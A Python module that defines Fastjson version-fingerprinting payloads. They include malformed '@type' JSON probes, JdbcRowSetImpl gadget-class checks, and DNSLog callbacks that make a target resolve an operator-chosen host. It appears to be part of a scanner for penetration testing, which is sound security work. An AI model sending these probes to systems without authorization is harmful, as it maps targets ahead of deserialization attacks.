"""Payloads for Fastjson version fingerprinting.

Reference: https://mp.weixin.qq.com/s/jbkN86qq9JxkGNOhwv9nxA

Note checklist implemented here:
1. AutoType: Class vs Random.String
2. SafeMode: java.lang.String + 多余引号畸形；开启时报错
3. AutoCloseable exact: incomplete JSON → fastjson-version（1.2.76+ 常写死 1.2.76）
4. 1.2.83: Test.TestException 不报错
5. DNSLog: <=1.2.47 / <=1.2.68 / 双 DNS 分 <=1.2.80 vs 1.2.83
6. 不出网：Exception / AutoCloseable / Class+Jdbc / Jdbc 报错二分
"""

from __future__ import annotations

import re
from dataclasses import dataclass
from typing import Optional

_DNS_HOST_RE = re.compile(r"^[A-Za-z0-9](?:[A-Za-z0-9.-]{0,251}[A-Za-z0-9])?$")


@dataclass(frozen=True)
class VersionProbe:
    id: str
    category: str
    description: str
    payload: str
    dns_related: bool = False
    dns_tags: tuple[str, ...] = ()


def validate_dns_host(host: str) -> str:
    host = host.strip().rstrip(".")
    if not host or not _DNS_HOST_RE.match(host) or ".." in host:
        raise ValueError(f"非法 DNSLog 主机名: {host!r}")
    return host


# --- 0. 负向对照：目标是否会回显解析错误 ---
NEGATIVE_CONTROL = VersionProbe(
    id="negative_control",
    category="control",
    description="残缺 JSON；若也不报错，则后续「不报错」信号不可信",
    payload='{"@type":',
)

# --- 1. AutoType 开启探测 ---
AUTOTYPE_CLASS = VersionProbe(
    id="autotype_class",
    category="autotype",
    description='java.lang.Class + empty val；AutoType 开启时报 "autoType is not support. java.lang.Class"',
    payload='{"xxx":{"@type":"java.lang.Class","val":""}}',
)

AUTOTYPE_RANDOM = VersionProbe(
    id="autotype_random",
    category="autotype",
    description="Random.String；AutoType 关闭时报 autoType is not support. Random.String",
    payload='{"xxx":{"@type":"Random.String"}}',
)

# --- 2. SafeMode 探测 ---
SAFEMODE_STRING = VersionProbe(
    id="safemode_string",
    category="safemode",
    description="java.lang.String + 多余引号畸形；SafeMode 开启时报错，关闭时通常不报错",
    payload='{"zero":{"@type":"java.lang.String"""}}}',
)

# --- 3. AutoCloseable 精确版本（响应含 fastjson-version）---
AUTOCLOSEABLE_EXACT = VersionProbe(
    id="autoclosable_exact",
    category="exact",
    description="残缺 AutoCloseable JSON，期望回显 fastjson-version",
    payload='{"@type":"java.lang.AutoCloseable"',
)

# --- 4. 1.2.83 具体探测 ---
PROBE_1_2_83 = VersionProbe(
    id="probe_1_2_83",
    category="exact",
    description="Test.TestException：仅 1.2.83 通常不报错",
    payload='{"xxx":{"@type":"Test.TestException"}}',
)

# --- 6. 不出网二分探测 ---
OFFLINE_EXCEPTION = VersionProbe(
    id="offline_exception",
    category="offline",
    description="不报错≈1.2.83/1.2.24；报错≈1.2.25-1.2.80",
    payload='{"zero":{"@type":"java.lang.Exception","@type":"org.XxException"}}',
)

OFFLINE_AUTOCLOSEABLE = VersionProbe(
    id="offline_autoclosable",
    category="offline",
    description="不报错≈1.2.24-1.2.68；报错≈1.2.70-1.2.83",
    payload='{"zero":{"@type":"java.lang.AutoCloseable","@type":"java.io.ByteArrayOutputStream"}}',
)

OFFLINE_CLASS_JDBC = VersionProbe(
    id="offline_class_jdbc",
    category="offline",
    description="不报错≈1.2.24-1.2.47；报错≈1.2.48-1.2.83",
    payload=(
        '{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},'
        '"b":{"@type":"com.sun.rowset.JdbcRowSetImpl"}}'
    ),
)

OFFLINE_JDBC = VersionProbe(
    id="offline_jdbc",
    category="offline",
    description="不报错≈1.2.24；报错≈1.2.25-1.2.83",
    payload='{"zero":{"@type":"com.sun.rowset.JdbcRowSetImpl"}}',
)

OFFLINE_PROBES: tuple[VersionProbe, ...] = (
    OFFLINE_EXCEPTION,
    OFFLINE_AUTOCLOSEABLE,
    OFFLINE_CLASS_JDBC,
    OFFLINE_JDBC,
)


def build_dns_version_probes(hosts: dict[str, str]) -> list[VersionProbe]:
    """Build DNS version probes.

    hosts keys: le47, le68, d80a, d80b
    """
    le47 = validate_dns_host(hosts["le47"])
    le68 = validate_dns_host(hosts["le68"])
    d80a = validate_dns_host(hosts["d80a"])
    d80b = validate_dns_host(hosts["d80b"])
    return [
        VersionProbe(
            id="dns_le_1_2_47",
            category="dns",
            description="DNS：命中则大致 <=1.2.47",
            payload=(
                '[{"@type":"java.lang.Class","val":"java.io.ByteArrayOutputStream"},'
                '{"@type":"java.io.ByteArrayOutputStream"},'
                f'{{"@type":"java.net.InetSocketAddress"{{"address":,"val":"{le47}"}}}}]'
            ),
            dns_related=True,
            dns_tags=("le47",),
        ),
        VersionProbe(
            id="dns_le_1_2_68",
            category="dns",
            description="DNS：命中则大致 <=1.2.68",
            payload=(
                '[{"@type":"java.lang.AutoCloseable","@type":"java.io.ByteArrayOutputStream"},'
                '{"@type":"java.io.ByteArrayOutputStream"},'
                f'{{"@type":"java.net.InetSocketAddress"{{"address":,"val":"{le68}"}}}}]'
            ),
            dns_related=True,
            dns_tags=("le68",),
        ),
        VersionProbe(
            id="dns_1_2_80_83",
            category="dns",
            description="DNS：仅 d80a≈1.2.80；d80a+d80b≈1.2.83",
            payload=(
                '[{"@type":"java.lang.Exception","@type":"com.alibaba.fastjson.JSONException",'
                f'"x":{{"@type":"java.net.InetSocketAddress"{{"address":,"val":"{d80a}"}}}}}},'
                '{"@type":"java.lang.Exception","@type":"com.alibaba.fastjson.JSONException",'
                f'"message":{{"@type":"java.net.InetSocketAddress"{{"address":,"val":"{d80b}"}}}}}}]'
            ),
            dns_related=True,
            dns_tags=("d80a", "d80b"),
        ),
    ]


def offline_probes() -> list[VersionProbe]:
    return [
        NEGATIVE_CONTROL,
        AUTOTYPE_CLASS,
        AUTOTYPE_RANDOM,
        SAFEMODE_STRING,
        AUTOCLOSEABLE_EXACT,
        PROBE_1_2_83,
        *OFFLINE_PROBES,
    ]


def all_version_probes(dns_hosts: Optional[dict[str, str]] = None) -> list[VersionProbe]:
    probes = offline_probes()
    if dns_hosts:
        probes.extend(build_dns_version_probes(dns_hosts))
    return probes
